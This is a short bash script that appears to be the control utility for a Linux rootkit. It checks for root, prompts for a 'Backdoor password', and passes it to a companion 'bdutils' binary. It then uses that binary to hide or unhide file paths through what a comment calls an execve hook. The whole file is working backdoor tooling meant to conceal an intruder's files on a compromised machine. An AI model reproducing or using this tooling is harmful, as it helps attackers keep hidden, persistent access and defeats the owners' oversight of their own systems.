#!/bin/bash

# this file utilises the 'controller' in the execve hook.
# you can totally just 'chown `id -g`:`id -g` ...'/'chgrp ...'

[ $(id -u) != 0 ] && exit

verify_password()
{
    read -s -p "Backdoor password: "
    [ -z $REPLY ] && exit
    password=$REPLY

    echo "Verifying pasword ..."
    ./bdutils $password lol || { echo "Incorrect password"; exit; }
    echo "Password correct."
}

USAGE="
Usage: $0 [ -h | -u ]
    -h [path]: Hide file.
    -u [path]: Unhide file.
"

OPTIND=1
while getopts "huk?" opt; do
    case "$opt" in
    h)
        [ -z $2 ] && { echo "No path given to hide."; exit; }
        verify_password
        echo "Hiding $2"
        ./bdutils $password hide_path $2 || echo "There was an error hiding $2"
        exit
        ;;
    u)
        [ -z $2 ] && { echo "No path given to unhide."; exit; }
        verify_password
        echo "Unhiding $2"
        ./bdutils $password unhide_path $2 || echo "There was an error unhiding $2"
        exit
        ;;
    ?)
        echo "$USAGE"
        exit
        ;;
    esac
done

echo "$USAGE"
